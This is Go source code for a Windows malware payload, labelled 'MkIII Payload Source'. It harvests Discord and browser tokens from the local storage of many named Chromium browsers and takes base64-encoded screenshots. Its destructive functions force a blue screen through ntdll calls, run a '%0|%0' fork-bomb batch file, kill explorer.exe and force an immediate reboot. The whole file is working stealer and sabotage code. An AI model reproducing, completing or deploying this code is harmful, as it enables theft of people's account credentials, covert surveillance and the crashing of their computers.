/* This package is to be compiled for Win32 or Win64 based Systems.

MkIII Payload Source
(c) 2022/23 Studio 7 Development

> Go Implementation
*/

package main

import "C"

import (
	"encoding/base64"
	"fmt"
	"github.com/vova616/screenshot"
	"image/png"
	"log"
	"os"
	"os/exec"
	"strings"
	"sync"
	"syscall"
	"unsafe"
)

var (
	ntdll = syscall.NewLazyDLL("ntdll.dll")

	RtlAdjustPrivilege = ntdll.NewProc("RtlAdjustPrivilege")
	NtRaiseHardError   = ntdll.NewProc("NtRaiseHardError")

	PLATFORMS = [27]PLATFORM{
		{Chromium: false,
			DataFiles: ROAMING + "\\discord"},
		{Chromium: false,
			DataFiles: ROAMING + "\\discordcanary"},
		{Chromium: false,
			DataFiles: ROAMING + "\\discordptb"},
		{Chromium: true,
			LocalState: ROAMING + "\\Opera Software\\Opera Stable\\Local State",
			DataFiles:  ROAMING + "\\Opera Software\\Opera Stable"},
		{Chromium: true,
			LocalState: LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Local State",
			DataFiles:  LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default"},
		{Chromium: true,
			LocalState: ROAMING + "\\Opera Software\\Opera GX Stable\\Local State",
			DataFiles:  ROAMING + "\\Opera Software\\Opera GX Stable"},
		{Chromium: true,
			LocalState: LOCAL + "\\Google\\Chrome\\User Data\\Local State",
			DataFiles:  LOCAL + "\\Google\\Chrome\\User Data\\Default"},
		{Chromium: true,
			LocalState: LOCAL + "\\Yandex\\YandexBrowser\\User \\Local State",
			DataFiles:  LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default"},
		{Chromium: true,
			LocalState: LOCAL + "\\Chromium\\User Data\\Local State",
			DataFiles:  LOCAL + "\\Chromium\\User Data\\Default"},
		{Chromium: true,
			LocalState: LOCAL + "\\Epic Privacy Browser\\User Data\\Local State",
			DataFiles:  LOCAL + "\\Epic Privacy Browser\\User Data\\Default"},
		{Chromium: true,
			LocalState: LOCAL + "\\Amigo\\User Data\\Local State",
			DataFiles:  LOCAL + "\\Amigo\\User Data\\Default"},
		{Chromium: true,
			LocalState: LOCAL + "\\Vivaldi\\User Data\\Local State",
			DataFiles:  LOCAL + "\\Vivaldi\\User Data\\Default"},
		{Chromium: true,
			LocalState: LOCAL + "\\Orbitum\\User Data\\Local State",
			DataFiles:  LOCAL + "\\Orbitum\\User Data\\Default"},
		{Chromium: true,
			LocalState: LOCAL + "\\Mail.Ru\\Atom\\User Data\\Local State",
			DataFiles:  LOCAL + "\\Mail.Ru\\Atom\\User Data\\Default"},
		{Chromium: true,
			LocalState: LOCAL + "\\Kometa\\User Data\\Local State",
			DataFiles:  LOCAL + "\\Kometa\\User Data\\Default"},
		{Chromium: true,
			LocalState: LOCAL + "\\Comodo\\Dragon\\User Data\\Local State",
			DataFiles:  LOCAL + "\\Comodo\\Dragon\\User Data\\Default"},
		{Chromium: true,
			LocalState: LOCAL + "\\Torch\\User Data\\Local State",
			DataFiles:  LOCAL + "\\Torch\\User Data\\Default"},
		{Chromium: true,
			LocalState: LOCAL + "\\Comodo\\User Data\\Local State",
			DataFiles:  LOCAL + "\\Comodo\\User Data\\Default"},
		{Chromium: true,
			LocalState: LOCAL + "\\Slimjet\\User Data\\Local State",
			DataFiles:  LOCAL + "\\Slimjet\\User Data\\Default"},
		{Chromium: true,
			LocalState: LOCAL + "\\360Browser\\Browser\\User Data\\Local State",
			DataFiles:  LOCAL + "\\360Browser\\Browser\\User Data\\Default"},
		{Chromium: true,
			LocalState: LOCAL + "\\Maxthon3\\User Data\\Local State",
			DataFiles:  LOCAL + "\\Maxthon3\\User Data\\Default"},
		{Chromium: true,
			LocalState: LOCAL + "\\K-Meleon\\User Data\\Local State",
			DataFiles:  LOCAL + "\\K-Meleon\\User Data\\Default"},
		{Chromium: true,
			LocalState: LOCAL + "\\Sputnik\\Sputnik\\User Data\\Local State",
			DataFiles:  LOCAL + "\\Sputnik\\Sputnik\\User Data\\Default"},
		{Chromium: true,
			LocalState: LOCAL + "\\Nichrome\\User Data\\Local State",
			DataFiles:  LOCAL + "\\Nichrome\\User Data\\Default"},
		{Chromium: true,
			LocalState: LOCAL + "\\CocCoc\\Browser\\User Data\\Local State",
			DataFiles:  LOCAL + "\\CocCoc\\Browser\\User Data\\Default"},
		{Chromium: true,
			LocalState: LOCAL + "\\uCozMedia\\Uran\\User Data\\Local State",
			DataFiles:  LOCAL + "\\uCozMedia\\Uran\\User Data\\Default"},
		{Chromium: true,
			LocalState: LOCAL + "\\Chromodo\\User Data\\Local State",
			DataFiles:  LOCAL + "\\Chromodo\\User Data\\Default"},
	}
)

func GetTokens() []string {

	var WG sync.WaitGroup
	var T []string

	for _, Path := range PLATFORMS {
		if !FileExists(Path.DataFiles) {
			continue
		}

		var PLATFORM_PATH string = Path.DataFiles + "\\Local Storage\\leveldb\\"

		items, _ := os.ReadDir(PLATFORM_PATH)
		for _, File := range items {
			FName := File.Name()
			var t []string
			if File.IsDir() || (!strings.HasSuffix(FName, ".log") && !strings.HasSuffix(FName, ".ldb")) {
				continue
			}

			// Do stuff here
			WG.Add(1)
			go func(FName string) {
				defer WG.Done()

				b, e := os.ReadFile(PLATFORM_PATH + FName)
				if e != nil {
					log.Fatalf(e.Error())
				}

				t = FindAllTokens(string(b))

				if len(t) > 0 {
					T = append(T, t...)
				}
			}(FName)
		}
		WG.Wait()
	}
	return T
}

func GetScreenShot() string {
	if _, err := os.Stat(TEMPFILEDIR); os.IsNotExist(err) {
		os.MkdirAll(TEMPFILEDIR, 0700)
	}

	img, err := screenshot.CaptureScreen()
	if err != nil {
		panic(err)
	}
	f, err := os.Create(TEMPFILEDIR + "\\CAPTURE.png")
	if err != nil {
		panic(err)
	}
	err = png.Encode(f, img)
	if err != nil {
		panic(err)
	}
	var _ = f.Close()

	data, _ := os.ReadFile(TEMPFILEDIR + "\\CAPTURE.png")

	return strings.ReplaceAll(base64.StdEncoding.EncodeToString([]byte(data)), "=", "")
}

func DoBSoD() {
	RtlAdjustPrivilege.Call(19, 1, 0, uintptr(unsafe.Pointer(new(bool))))
	NtRaiseHardError.Call(0xDEADFEED, 0, 0, uintptr(0), 6, uintptr(unsafe.Pointer(new(uintptr))))
}

//export StarveSystem
func StarveSystem() {
	file := TEMP + "\\" + RandStringBytes(8) + ".bat"

	f, _ := os.Create(file)
	f.Close()

	err := os.WriteFile(file, []byte("%0|%0"), 0644)

	if err != nil {
		fmt.Println("Something went wrong: ", err)
	}

	exec.Command("cmd.exe", "/C", file).Start()
}

func KillDesktop() {
	err := exec.Command("cmd.exe", "/c", "taskkill", "/f", "/t", "/im", "explorer.exe").Run()
	if err != nil {
		fmt.Println("Failed to kill Desktop process:", err)
	}
}

func ForceShutdown() {
	if err := exec.Command("cmd.exe", "/C", "shutdown", "/t", "0", "/r").Run(); err != nil {
		fmt.Println("Failed to initiate shutdown:", err)
	}
}
